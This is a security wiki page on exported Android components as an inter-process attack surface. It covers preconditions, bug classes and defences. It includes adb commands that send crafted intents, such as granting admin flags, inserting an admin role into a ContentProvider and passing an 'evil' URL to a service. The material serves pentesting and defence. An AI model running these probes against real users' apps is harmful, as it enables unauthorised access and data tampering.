---
title: Android components
slug: android-components
---

> **TL;DR:** Activities, Services, BroadcastReceivers and ContentProviders declared `exported="true"` are the IPC attack surface — any installed app (or a malicious deeplink) can reach them.

## What it is
Android apps are built from four component types registered in `AndroidManifest.xml`. Each component can be invoked by an `Intent`, either explicit (named target) or implicit (matched by intent filter). When a component is exported, it accepts intents from other UIDs on the device, turning internal handler code into a remotely reachable RPC endpoint that attackers probe for auth bypass, parameter injection and state confusion.

## Preconditions / where it applies
- Component declared `android:exported="true"` (implicit when an `<intent-filter>` is present pre-API 31; explicit and required from API 31+)
- No matching `android:permission=` guard, or the guard uses a `normal` protection level
- App handles intent extras without origin/signature checks
- Useful against any app installed on a device the attacker can run code on (malicious app, browser deeplink, ADB shell)

## Technique
Enumerate components from the manifest, then craft intents against each surface.

```bash
# Pull APK and inspect exported surface
apktool d target.apk -o out/
grep -E 'exported="true"|<intent-filter' out/AndroidManifest.xml
```

```bash
# Launch an exported Activity from adb with attacker-controlled extras
adb shell am start -n com.victim/.PrivilegedActivity \
  --es token "AAAA" --ez admin true
# Send to an exported Service
adb shell am startservice -n com.victim/.SyncService --es url http://evil/
# Trigger an exported BroadcastReceiver
adb shell am broadcast -a com.victim.RESET --es user attacker
# Query / write an exported ContentProvider
adb shell content query --uri content://com.victim.provider/users
adb shell content insert --uri content://com.victim.provider/users \
  --bind name:s:x --bind role:s:admin
```

Common bugs: implicit-trust on `getIntent().getStringExtra(...)`, pending-intent hijack via mutable PendingIntents, path traversal in `openFile()` on ContentProviders, and `WebView.loadUrl(getIntent().getDataString())` (see [[android-deeplink-abuse]]).

## Detection and defence
- Set `android:exported="false"` unless the component is meant for cross-app use
- Gate sensitive components with custom permissions at `signature` protection level
- Validate every extra: types, lengths, URI schemes, intent action allow-list
- Use `PendingIntent.FLAG_IMMUTABLE` (mandatory from API 34)
- Static analysis: MobSF, [[android-manifest-analysis]] for the exported-component baseline
- Runtime: log Binder calls / PackageManager queries from unexpected UIDs

## References
- [Android Application fundamentals](https://developer.android.com/guide/components/fundamentals) — official component model
- [HackTricks – Android applications basics](https://book.hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/index.html) — exported-component abuse cheatsheet
- [Drozer](https://github.com/WithSecureLabs/drozer) — IPC-surface scanner
